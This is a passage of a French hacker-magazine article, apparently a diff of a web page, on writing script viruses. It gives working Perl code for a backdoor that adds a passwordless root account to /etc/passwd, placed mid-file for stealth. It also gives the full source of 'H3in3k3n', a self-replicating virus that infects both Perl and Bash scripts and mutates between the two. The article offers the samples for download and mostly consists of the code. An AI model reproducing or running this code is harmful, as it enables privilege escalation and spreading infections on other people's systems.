+&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; <span style="color: black;">&#125;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>Encore une fois rien de compliqué... Je passe très vite sur cette partie ; je ne montrerai pas les tests, c'est sans interêt puisque ca fonctionne pareil que pour les scripts shell. En ce qui concerne l'optimisation c'est toujours pareil.</p>
+<p>L'archive virus.zip contient une version à moitié optimisée.</p>
+<p>Comme précédement, on fait un test de vitesse sur l'infection de 9 fichiers:</p>
+<pre>
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="95f0f8e5f0e7a5e7d5f9f4e5e1fae5">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$ time -p ./h0egaard3n
+real 0.04
+user 0.03
+sys 0.01
+</pre>
+<p>Il y a rien a dire, le perl c'est carrément plus rapide!</p>
+<h3>II. Backdoor</h3>
+<p>Imaginez que le root lance un script infecté : si ce script contient une petite backdoor alors la sécurité du système est grandemment compromise.</p>
+<p>Voici un exemple de backdoor ajoutant un compte avec les droits root sans mot de passe:</p>
+<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #0000ff;">$f</span><span style="color: #339933;">=</span><span style="color: #ff0000;">&quot;/etc/passwd&quot;</span><span style="color: #339933;">;</span><br/>
+<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #339933;">-</span>w <span style="color: #0000ff;">$f</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span><span style="color: #339933;">-</span>r <span style="color: #0000ff;">$f</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#regarde si l'on peut lire et écrire le /etc/passwd</span><br/>
+&nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a><span style="color: black;">&#40;</span>File<span style="color: #339933;">,</span> <span style="color: #0000ff;">$f</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; <span style="color: #0000ff;">@t</span><span style="color: #339933;">=</span><span style="color: #009999;">&lt;File&gt;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#copie le fichier dans @t</span><br/>
+&nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a><span style="color: black;">&#40;</span>File<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; <span style="color: #0000ff;">$bd</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;ftpp::0:0:ftp:/:/bin/sh<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
+&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@t</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">6</span><span style="color: black;">&#93;</span> <span style="color: #b1b100;">ne</span> <span style="color: #0000ff;">$bd</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#teste si le compte ftpp avec droits root existe déjà</span><br/>
+&nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #cc66cc;">0</span> <span style="color: #339933;">..</span> <span style="color: #cc66cc;">5</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@t1</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$_</span><span style="color: black;">&#93;</span><span style="color: #339933;">=</span><span style="color: #0000ff;">@t</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$_</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><span style="color: black;">&#125;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#sauvegarde les 6 premières lignes</span><br/>
+&nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #cc66cc;">6</span> <span style="color: #339933;">..</span> <span style="color: #0000ff;">$#t</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@t2</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$_</span><span style="color: black;">&#93;</span><span style="color: #339933;">=</span><span style="color: #0000ff;">@t</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$_</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><span style="color: black;">&#125;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#sauvegarde les lignes 7 jusqua la fin</span><br/>
+&nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a> <span style="color: black;">&#40;</span>File<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&gt;$f&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> File <span style="color: #0000ff;">@t1</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#restore les début</span><br/>
+&nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> File <span style="color: #0000ff;">$bd</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#ajoute notre compte sans pass avec droit root</span><br/>
+&nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> File <span style="color: #0000ff;">@t2</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#restore la suite</span><br/>
+<span style="color: black;">&#125;</span><span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>Cette backdoor est toute simple : si elle peut ouvrir /etc/passwd elle regarde la ligne n°7 pour voir si elle n'a pas déjà ajouté le compte avec droit root sans pass. Si ce n'est pas le cas elle l'ajoute.</p>
+<p>J'ai choisi de ne mettre le nouveau compte compte root ni au début ni à la fin du fichier passwd, mais dans le milieu. La backdoor est un peu plus grosse mais c'est plus discret. Si le root lance ce bout de code alors un simple user n'a plus qu'a faire : "su ftpp" et il obtient les droits root.</p>
+<p>Il est tout aussi simple de faire la même backdoor pour le virus bash c0r0na.</p>
+<h2>Partie 3: Perl-shell script infection</h2>
+<p>Maintenant encore plus amusant :)</p>
+<p>Faire une souche virale qui serait capable d'infecter à la fois des scripts shell et des scripts perl. Le script perl infecté serait capable à son tour d'infecter soit un autre script perl soit un script shell et inversement.</p>
+<p>Comment faire ? :</p>
+<p>Notre souche contient pour commencer par exemple le script perl au début, et à la suite le script bash, mais celui si désactivé, c'est a dire commenté avec un "#" (évidemment car du bash dans un script perl ça na pas de sens).</p>
+<p>Si ce script détecte un script perl infectable dans le répertoire, alors il se recopie au début à l'identique (il garde le script bash commenté biensur). Puis il ajoute le script original.</p>
+<p>En revanche, si ce script rencontre un fichier bash infectable il recopie la partie bash décommenté au début, commente la parti perl et la recopie en suivant, puis remet le script original. Le script bash doit biensur avoir la même capassité que le script perl décrit au-dessus. Comment ça mes explication sont pas claires ? :)</p>
+<h3>I. Virus parasite à mutation simple</h3>
+<p>Notre virus doit donc être capable de faire des mutations de son code:</p>
+<pre>
+ --------                         --------                         --------
+|virus   |                       |virus   |                       |virus   |
+|perl    |       rencontre       |bash    |       rencontre       |perl    |
+|--------|  --&gt;  un script  --&gt;  |--------|  --&gt;  un script  --&gt;  |--------|
+|#virus  |       bash            |#virus  |       perl            |#virus  |
+|#bash   |                       |#perl   |                       |#bash   |
+ --------                        |--------|                       |--------|
+    ^                            |script  |                       |script  |
+    |                            |bash    |                       |perl    |
+    |                            |original|                       |original|
+    |                             --------                         --------
+    |                                ^                                ^
+    |                                |                                |
+Souche virale,               Mutation : la                     Mutation : la partie perl
+script perl actif            partie bash est activé            est réactivé et passé
+en début, script             et placé en début.                en début.
+bash déactivé	             La parti perl suit                La parti bash suit et
+à la suite.	             et est désactivé.                 est désactivé.
+		             En fin on a le                    En fin on a le script
+		             script original.                  original.
+</pre>
+<p>Biensur le code va devenir vraiment important et les fichiers infecté vont beaucoup grossir. Et puis imaginez la geule du gars qui va regarder un fichier infecté, avec du code perl commenté dans son script shell ou l'inverse.</p>
+<p><strong>Le code</strong></p>
+<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">#!/usr/bin/perl &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #parti perl</span><br/>
+<span style="color: black; font-style: italic;">#H3in3k3n &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #marque d'infection</span><br/>
+<a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a><span style="color: black;">&#40;</span>File<span style="color: #339933;">,</span><span style="color: #0000ff;">$0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<span style="color: #0000ff;">@vx</span><span style="color: #339933;">=</span><span style="color: #009999;">&lt;File&gt;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#place le virus dans la table @vx</span><br/>
+<a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a><span style="color: black;">&#40;</span>File<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<span style="color: #b1b100;">foreach</span> <span style="color: #0000ff;">$Fichier</span> <span style="color: black;">&#40;</span><span style="color: #339933;">&lt;*&gt;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#recherche les fichiers</span><br/>
+&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #339933;">-</span>f <span style="color: #0000ff;">$Fichier</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span><span style="color: #339933;">-</span>r <span style="color: #0000ff;">$Fichier</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span><span style="color: #339933;">-</span>w <span style="color: #0000ff;">$Fichier</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span> <span style="color: black; font-style: italic;">#test si fichier et vérifie les droits</span><br/>
+&nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a><span style="color: black;">&#40;</span>File<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;$Fichier&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #0000ff;">@Temp</span><span style="color: #339933;">=</span><span style="color: #009999;">&lt;File&gt;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#sauvegarde le contenu du fichier dans @Temp</span><br/>
+&nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a><span style="color: black;">&#40;</span>File<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=~</span> <span style="color: #ff0000;">&quot;/perl&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#teste si c'est un fichier perl</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">1</span><span style="color: black;">&#93;</span> <span style="color: #b1b100;">ne</span> <span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\#</span>H3in3k3n<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#teste si déjà infecté</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a><span style="color: black;">&#40;</span>File<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&gt;$Fichier&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> File <span style="color: #0000ff;">@vx</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span> <span style="color: #339933;">..</span> <span style="color: #cc66cc;">61</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#écrit le virus</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> File <span style="color: #0000ff;">@Temp</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#récrit le script original</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a> <span style="color: black;">&#40;</span>File<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: black;">&#125;</span><span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=~</span> <span style="color: #ff0000;">&quot;/bash&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#si c'est un shell script</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">1</span><span style="color: black;">&#93;</span> <span style="color: #b1b100;">ne</span> <span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\#</span>H3in3k3n<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #cc66cc;">0</span> <span style="color: #339933;">..</span> <span style="color: #cc66cc;">28</span> <span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@vx2</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$_</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\#</span>&quot;</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">@vx</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$_</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><span style="color: black;">&#125;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#commente les 29 premières lignes, résultat dans @vx2</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #cc66cc;">29</span> <span style="color: #339933;">..</span> <span style="color: #cc66cc;">61</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@vx1</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$_</span><span style="color: black;">&#93;</span><span style="color: #339933;">=</span> <span style="color: #0000ff;">@vx</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$_</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@vx1</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$_</span><span style="color: black;">&#93;</span><span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">s/#//</span><span style="color: #339933;">;</span><span style="color: black;">&#125;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#décommente les lignes 30 à 62, résultat dans @vx1</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a><span style="color: black;">&#40;</span>File<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&gt;$Fichier&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> File <span style="color: #0000ff;">@vx1</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#écrit la parti shell script</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> File <span style="color: #0000ff;">@vx2</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#écrit la parti perl script commenté</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> File <span style="color: #0000ff;">@Temp</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#récrit le script original</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a><span style="color: black;">&#40;</span>File<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><span style="color: black;">&#125;</span><span style="color: black;">&#125;</span><span style="color: black;">&#125;</span><br/>
+<span style="color: black; font-style: italic;">##!/bin/bash&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #parti bash</span><br/>
+<span style="color: black; font-style: italic;">##H3in3k3n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #marque d'infection</span><br/>
+<span style="color: black; font-style: italic;">#for fichier in * &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #recherche de fichier</span><br/>
+<span style="color: black; font-style: italic;">#do</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp;if [ -f $fichier -a -w $fichier ];then &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #teste si fichier et vérifie les droits</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp;if file $fichier | grep Bourne-A &gt; /dev/null &nbsp; &nbsp; #teste si c'est un fichier BASH</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; then</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; head -n 2 $fichier &nbsp;&gt; .a</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if grep H3in3k3n .a &gt; /dev/null &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #teste si déjà infecté</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; then</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rm -f .a</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cat $fichier &gt; .a &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #sauvegarde le script original dans .a</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; head -n 62 $0 &gt; $fichier&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #recopie le virus dans le fichier</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cat .a &gt;&gt; $fichier&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #recopie le script original a la suite</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rm -f .a</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fi;fi</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp;if file $fichier | grep perl &gt; /dev/null &nbsp; &nbsp; &nbsp; &nbsp; #teste si fichier perl</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp;then</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;head -n 2 $fichier &nbsp;&gt; .a</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if grep H3in3k3n .a &gt; /dev/null &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #teste si infecté</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; then</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rm -f .a</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cat $fichier &gt; .a</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; awk '{ if ((NR&gt;=34)&amp;&amp;(NR&lt;=62)) print $0 }' $0 &gt; .b</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cut -b 2- .b &gt; $fichier &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #décommente les lignes 34 à 62, écrit dans le fichier</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; head -n 32 $0 &gt; .b</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sed -e 's/^/#/' .b &gt;&gt; $fichier&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #commente la parti bash et la copi à la suite</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cat .a &gt;&gt; $fichier&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #ecrit le script orignal en suivant</span><br/>
+<span style="color: black; font-style: italic;"># &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rm -f .a .b</span><br/>
+<span style="color: black; font-style: italic;">#fi;fi;fi</span><br/>
+<span style="color: black; font-style: italic;">#done</span><br/>
+&nbsp;</div>
+<p>Voila mon virus H3in3k3n ! D'aprés mes tests il fonctionne correctement ( merci Ciel ).</p>
+<p>Les scripts perl et/ou bash, infectés par cette souche, sont à leur tour capable d'infecter d'autres scripts perl et bash de façon correcte et ainsi de suite. J'ai commencé le perl il y a 3 semaines, juste avant d'écrire cet article donc il y a certainement des choses maladroites. Il y a des choses à arranger comme par exemple faire le test d'infection avant de faire le test sur le type de fichier, cela permet de gagner un test, supprimmer les 2 fichiers temporaires crés la partie bash ...</p>
+<h2>Conclusion</h2>
+<p>Peut être qu'une version améliorée sera publié dans le prochain IOC magazine ; là je n'est pas eu le temps entre les exams, fêter les vacances et la réussite aux exams ... :)</p>
+<p>Si vous voulez tester ces virus, vous les trouverez dans l'archive virus.zip</p>
+<p>ATTENTION : NE TESTEZ CECI QUE SUR VOTRE PROPRE MACHINE.</p>
